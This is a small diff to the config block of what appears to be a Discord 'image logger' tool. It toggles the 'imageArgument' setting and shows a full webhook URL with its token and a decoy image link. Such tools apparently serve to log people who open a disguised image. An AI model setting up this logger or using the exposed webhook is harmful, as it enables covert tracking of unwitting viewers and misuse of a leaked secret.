@@ -15,7 +15,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1335633980531150848/y88pQOv_QV5gw_QpZ0yq5ZbVnfMtndqfjL-o4kq5BrcrIU1jGjHjPwd4g8XDdVaNcijI",
     "image": "https://kinsta.com/wp-content/uploads/2020/08/tiger-jpg.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
-    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
+    "imageArgument": False, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
     "username": "mr irakli", # Set this to the name you want the webhook to have
